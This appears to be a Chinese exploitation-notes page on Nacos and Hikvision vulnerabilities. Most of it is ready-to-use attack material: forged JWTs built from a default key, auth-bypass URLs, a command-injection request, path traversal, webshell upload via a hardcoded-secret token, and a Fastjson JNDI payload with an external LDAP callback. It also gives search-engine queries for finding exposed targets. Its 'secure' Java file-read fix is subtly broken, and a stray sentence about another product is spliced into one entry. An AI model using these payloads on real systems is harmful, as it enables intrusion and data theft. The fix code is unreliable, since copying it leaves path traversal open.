<h4 id="Nacos默认key导致权限绕过登陆"><a href="#Nacos默认key导致权限绕过登陆" class="headerlink" title="Nacos默认key导致权限绕过登陆"></a>Nacos默认key导致权限绕过登陆</h4><h5 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Nacos中发现影响Nacos &lt;&#x3D; 2.1.0的问题，Nacos用户使用默认JWT密钥导致未授权访问漏洞。通过该漏洞，攻击者可以绕过用户名密码认证，直接登录Nacos用户</p>
<h5 id="版本-2"><a href="#版本-2" class="headerlink" title="版本"></a>版本</h5><p>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0</p>
<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>在nacos中，token.secret.key值是固定死的，位置在conf下的application.properties中：</p>
<p>nacos.core.auth.plugin.nacos.token.secret.key&#x3D;SecretKey012345678901234567890123456789012345678901234567890123456789<br> 1.获取token</p>
<p>利用该默认key可进行jwt构造，直接进入后台，构造方法：<br>在<a href="https://jwt.io/%E4%B8%AD%EF%BC%9A%E8%BE%93%E5%85%A5%E9%BB%98%E8%AE%A4key%EF%BC%9A">https://jwt.io/中：输入默认key：</a></p>
<p>SecretKey012345678901234567890123456789012345678901234567890123456789</p>
<p>然后再payload里面输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;sub&quot;: &quot;nacos&quot;,</span><br><span class="line"> &quot;exp&quot;: 1678899909</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里注意：1678899909这个值是unix时间戳，换算一下，要比你系统当前的时间更晚，比如当前的时间是2023年03月15日22:11:09，在这里面的时间戳时间是3月16号了：</p>
<p>复制上面得到的值，在burp里面选择登录之后构造：</p>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s</p>
<p>方框里面需要自行添加：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /nacos/v1/auth/users/login HTTP/1.1</span><br><span class="line">Host: 10.211.55.5:8848</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 33</span><br><span class="line">Origin: http://10.211.55.5:8848</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.211.55.5:8848/nacos/index.html</span><br><span class="line"></span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s</span><br><span class="line"></span><br><span class="line">username=crowsec&amp;password=crowsec</span><br><span class="line"></span><br><span class="line">此时就得到了token信息：</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 </span><br><span class="line">Vary: Origin</span><br><span class="line">Vary: Access-Control-Request-Method</span><br><span class="line">Vary: Access-Control-Request-Headers</span><br><span class="line">Content-Security-Policy: script-src <span class="string">&#x27;self&#x27;</span></span><br><span class="line">Set-Cookie: JSESSIONID=D90CF6E5B233685E4A39C1B1BDA9F185; Path=/nacos; HttpOnly</span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Wed, 15 Mar 2023 14:13:22 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 197</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;accessToken&quot;</span>:<span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s&quot;</span>,<span class="string">&quot;tokenTtl&quot;</span>:18000,<span class="string">&quot;globalAdmin&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;username&quot;</span>:<span class="string">&quot;nacos&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>此时就得到了nacos的token信息。<br>2.利用获取token登录后台</p>
<p>如何登录呢，在这里需要用假账号登录之后，再修改返回包就行了，试试看：<br>先用假账号登录，用burp拦截：</p>
<p>这肯定进不去的，在这里修改返回包，右键看下这个：</p>
<p>然后Forward，这边返回的信息肯定是无效的：</p>
<p>在这里使用刚刚burp里面生成的返回包进行替换，全部复制过去：</p>
<p>再forward一次：</p>
<p>此时就已经进去了：</p>
<p>3.使用默认密钥生成的JWT查看当前用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s&amp;pageNo=1&amp;pageSize=9 HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">accessToken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s</span><br></pre></td></tr></table></figure>

<p>4.利用默认密钥，添加hellonacos用户密码为hellonacos，创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /nacos/v1/auth/users HTTP/1.1</span><br><span class="line">Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="line">User-Agent: Mozilla/5.0 </span><br><span class="line">Authorization: Bearer  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg5OTkwOX0.Di28cDY76JCvTMsgiim12c4pukjUuoBz6j6dstUKO7s</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Wed, 15 Feb 2023 10:45:10 GMT</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 39</span><br><span class="line">username=hellonacos&amp;password=hellonacos</span><br></pre></td></tr></table></figure>





<h4 id="Nacos-Sync-未授权进后台"><a href="#Nacos-Sync-未授权进后台" class="headerlink" title="Nacos-Sync 未授权进后台"></a>Nacos-Sync 未授权进后台</h4><h5 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nacos-Sync 3.0</span><br></pre></td></tr></table></figure>

<h5 id="fofa语法-2"><a href="#fofa语法-2" class="headerlink" title="fofa语法"></a>fofa语法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;nacos&quot; &amp;amp;&amp;amp; title==&quot;Nacos-Sync&quot;</span><br></pre></td></tr></table></figure>

<h5 id="poc-5"><a href="#poc-5" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#拼接路径然后直接利用</span><br><span class="line">/#/serviceSync</span><br></pre></td></tr></table></figure>





<h4 id="Nacos-集群-Raft-反序列化漏洞"><a href="#Nacos-集群-Raft-反序列化漏洞" class="headerlink" title="Nacos 集群 Raft 反序列化漏洞"></a>Nacos 集群 Raft 反序列化漏洞</h4><blockquote>
<p>CNVD-2023-45001</p>
<p>该漏洞源于 Nacos 集群处理部分 Jraft 请求时，未限制使用 hessian 进行反 。序列化，攻击者可以通过发送特制的请求触发该漏洞，最终执行任意远程代码。<br>该漏洞源于 Smartbi 默认存在内置用户，在使用特定接口时，攻击者可绕过用户身份认证机制获取内置用户身份凭证，随后可使用获取的身份凭证调用后台接口，最终可能导致敏感信息泄露和代码执行。</p>
</blockquote>
<p><strong>影响版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.4.0 &lt;= Nacos &lt; 1.4.6</span><br><span class="line">2.0.0 &lt;= Nacos &lt; 2.2.3</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong><br><a href="https://github.com/c0olw/NacosRce/">https://github.com/c0olw/NacosRce/</a></p>
<p><strong>修复建议</strong></p>
<ol>
<li>默认配置下该漏洞仅影响 Nacos 集群间 Raft 协议通信的 7848 端口，此端口不承载客户端请求，可以通过限制集群外部 IP 访问 7848 端口来进行缓解。</li>
<li>官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本： <a href="https://github.com/alibaba/nacos/releases">https://github.com/alibaba/nacos/releases</a></li>
</ol>
<h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
<h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
<p><strong>排查步骤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/Security/users?auth=YWRtaW46MTEKYWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>auth内容是admin:11的base64编码。</p>
<p>获取系统监控快照，不需要进行身份验证。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/onvif-http/snapshot?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>下载摄像机配置文件，通过脚本解密配置文件获得账密信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://ip/System/configurationFile?auth=YWRtaW46MTEK</span><br></pre></td></tr></table></figure>

<p>用hex编辑器打开下载的configurationFile文件发现是加密后的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://github.com/chrisjd20/hikvision_CVE-2017-7921_auth_bypass_config_decryptor</span><br><span class="line">python3 decrypt_configurationFile.py configurationFile</span><br></pre></td></tr></table></figure>

<h4 id="cve-2021-36260"><a href="#cve-2021-36260" class="headerlink" title="cve-2021-36260"></a>cve-2021-36260</h4><p>影响范围</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img640" alt="图片"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652093950.png" alt="1686652093950"></p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652112690.png" alt="1686652112690"></p>
<p>漏洞poc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PUT /SDK/webLanguage HTTP/1.1</span><br><span class="line">Host: x.x.x.x</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="line">AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 89</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span></span><br><span class="line">encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;language&gt;$(ifconfig -a &gt;</span><br><span class="line">webLib/dd.asp)&lt;/language&gt;</span><br></pre></td></tr></table></figure>

<h4 id="流媒体管理服务器后台任意文件读取漏洞"><a href="#流媒体管理服务器后台任意文件读取漏洞" class="headerlink" title="流媒体管理服务器后台任意文件读取漏洞"></a>流媒体管理服务器后台任意文件读取漏洞</h4><p><strong>影响范围</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">流媒体管理服务器 V2.3.5</span><br></pre></td></tr></table></figure>

<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.title=&quot;流媒体管理服务器&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini</span><br></pre></td></tr></table></figure>

<p>fileName未输入文件名时，返回包会报错，错误信息中包含网站的部分绝对路径信息，经过路径构造可以获取当前php文件的内容</p>
<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686652380656.png" alt="1686652380656"></p>
<p>漏洞修复</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>php.ini 配置 open_basedir（针对PHP应用程序）。</span><br><span class="line"><span class="number">2.</span>用户输入配置白名单，对文件下载类型进行检查，判断是否为允许下载类型。</span><br><span class="line"><span class="number">3.</span>过滤路径回溯符../，或者直接将..替换成空。对参数进行过滤，依次过滤“.”、“..”、“/”、“\”等字符。</span><br><span class="line"><span class="number">4.</span>对于下载文件的目录做好限制，只能下载定目录下的文件，或者将要下载的资源文件路径存入数据库，附件下载时定数据库中的id即可，id即对应的资源。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileReader</span> &#123;</span><br><span class="line">    <span class="comment">// 正则表达式，用于过滤路径中的 ../ 字符串</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SAFE_PATH_PATTERN</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;[^/]+/\\.\\./&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 安全读取文件</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] readSafely(String path) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 将路径中的 ../ 替换为空字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">safePath</span> <span class="operator">=</span> SAFE_PATH_PATTERN.matcher(path).replaceAll(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用安全路径读取文件</span></span><br><span class="line">        <span class="type">Path</span> <span class="variable">filePath</span> <span class="operator">=</span> Paths.get(safePath);</span><br><span class="line">        <span class="keyword">return</span> Files.readAllBytes(filePath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这段代码中使用了正则表达式来过滤路径中的 ../ 字符串，确保文件只能被读取到预期的位置。</span><br><span class="line"></span><br><span class="line">使用方法：</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] fileData = FileReader.readSafely(<span class="string">&quot;/path/to/file&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    <span class="comment">// 处理异常</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="iVMS综合安防系统任意文件上传漏洞（0day）"><a href="#iVMS综合安防系统任意文件上传漏洞（0day）" class="headerlink" title="iVMS综合安防系统任意文件上传漏洞（0day）"></a><strong>iVMS综合安防系统任意文件上传漏洞（0day）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视iVMS系统存在在野 0day 漏洞，攻击者通过获取密钥任意构造token，请求&#x2F;resourceOperations&#x2F;upload接口任意上传文件，导致获取服务器webshell权限，同时可远程进行恶意代码执行。</p>
<p><strong>影响范围</strong></p>
<p>1.海康威视综合安防系统iVMS-5000</p>
<p>2.海康威视综合安防系统 iVMS-8700</p>
<p><strong>奇安信语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web.body=&quot;/views/home/file/installPackage.rar&quot;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞poc</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;fileUploader&quot;</span>;filename=<span class="string">&quot;1.jsp&quot;</span></span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /eps/api/resourceOperations/upload HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://you-ip</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=7634604FBE659A8532E666FE4AA41BE9</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">service=http%3A%2F%2Fx.x.x.x%3Ax%2Fhome%2Findex.action</span><br></pre></td></tr></table></figure>

<p>构造token绕过认证  （内部机制：如果token值与请求url+secretkey的md5值相同就可以绕过认证）</p>
<p>secretkey是代码里写死的（默认值：secretKeyIbuilding）</p>
<p>token值需要进行MD5加密（32位大写）</p>
<p>组合：token&#x3D;MD5(url+”secretKeyIbuilding”)</p>
<blockquote>
<p>md5加密 ：<a href="http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding">http://x.x.x//eps/api/resourceOperations/uploadsecretKeyIbuilding</a></p>
</blockquote>
<p>重新验证，构造文件上传poyload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /eps/api/resourceOperations/upload?token=构造的token值 HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: ISMS_8700_Sessionname=A29E70BEA1FDA82E2CF0805C3A389988</span><br><span class="line">Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 174</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUploader&quot;;filename=&quot;1.jsp&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">test</span><br><span class="line">------WebKitFormBoundaryGEJwiloiPo</span><br></pre></td></tr></table></figure>

<p>显示上传成功且返回了resourceUuid值</p>
<p>验证路径：<a href="http://url/eps/upload/resourceUuid%E7%9A%84%E5%80%BC.jsp">http://url/eps/upload/resourceUuid的值.jsp</a></p>
<h4 id="IVMS系统任意文件上传漏洞"><a href="#IVMS系统任意文件上传漏洞" class="headerlink" title="IVMS系统任意文件上传漏洞"></a><strong>IVMS系统任意文件上传漏洞</strong></h4><p><strong>检测POC</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/sccmdaveli/hikvision-poc</span><br></pre></td></tr></table></figure>

<p><strong>漏洞修复</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1.</span>在服务器后端控制上传文件类型，处理时强制使用随机数改写文件名和文件路径,不要使用用户自定义的文件名和文件路径。</span><br><span class="line"><span class="number">2.</span>在服务器后端建议使用白名单的方法对上传的文件进行过滤，上传的目录不进行解析，只提供下载权限。</span><br><span class="line"><span class="number">3.</span>开源编辑器上传漏洞：若新版编辑器已修复漏洞，请更新编辑器版本。</span><br><span class="line"><span class="number">4.</span>除了以上的方法之外，还可将被上传的文件限制在某一路径下，并在文件上传目录禁止脚本解析。</span><br><span class="line"></span><br><span class="line">参考代码：</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.security.SecureRandom;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Part;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALLOWED_FILE_TYPES</span> <span class="operator">=</span> <span class="string">&quot;image/jpeg,image/png,image/gif&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">SecureRandom</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">      <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    <span class="comment">// 获取上传的文件</span></span><br><span class="line">    <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查文件类型是否被允许</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileType</span> <span class="operator">=</span> filePart.getContentType();</span><br><span class="line">    <span class="keyword">if</span> (!ALLOWED_FILE_TYPES.contains(fileType)) &#123;</span><br><span class="line">      response.sendError(HttpServletResponse.SC_BAD_REQUEST, <span class="string">&quot;Invalid file type.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用随机数改写文件名和文件路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> generateRandomFileName(filePart.getSubmittedFileName());</span><br><span class="line">    <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> request.getServletContext().getRealPath(<span class="string">&quot;/&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span> + File.separator + fileName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 保存文件</span></span><br><span class="line">    filePart.write(filePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回响应</span></span><br><span class="line">    response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">generateRandomFileName</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">randomNumber</span> <span class="operator">=</span> random.nextInt();</span><br><span class="line">    String[] fileNameParts = fileName.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileExtension</span> <span class="operator">=</span> fileNameParts[fileNameParts.length - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> randomNumber + <span class="string">&quot;.&quot;</span> + fileExtension;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">在上面的代码中，我们首先使用 getPart 方法获取上传的文件。然后检查文件类型是否在允许的文件类型列表中。如果不在，则发送错误响应。否则，我们使用随机数改写文件名和文件路径。最后，我们使用 write 方法将文件写入磁盘，并返回响应。</span><br></pre></td></tr></table></figure>

<h4 id="综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）"><a href="#综合安防管理平台存在Fastjson远程命令执行漏洞（2022-HVV洞）" class="headerlink" title="综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）"></a><strong>综合安防管理平台存在Fastjson远程命令执行漏洞（2022 HVV洞）</strong></h4><p><strong>漏洞描述</strong></p>
<p>海康威视综合安防管理平台存在Fastjson远程命令执行漏洞，该漏洞可执行系统命令，直接获取服务器权限。</p>
<p><strong>搜索引擎语法</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;HIKVISION-综合安防管理平台&quot;</span><br></pre></td></tr></table></figure>

<p><strong>poc</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /bic/ssoService/v1/applyCT HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Dnt: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: cross-site</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 215</span><br><span class="line"></span><br><span class="line">&#123;&quot;a&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://2vyvoa.dnslog.cn&quot;,&quot;autoCommit&quot;:true&#125;,&quot;hfe4zyyzldp&quot;:&quot;=&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>先看看能不能连dnslog服务器，如果dnslog服务器收到请求，则大概率存在命令执行漏洞 </p>
<p>确定dnslog能收到请求之后，使用工具JNDIExploit-1.2-SNAPSHOT.jar 进一步利用。把该工具上传到公网服务器后，执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 你的公网服务器ip</span><br></pre></td></tr></table></figure>

<p>记得对外开放1389 8080端口哦 </p>
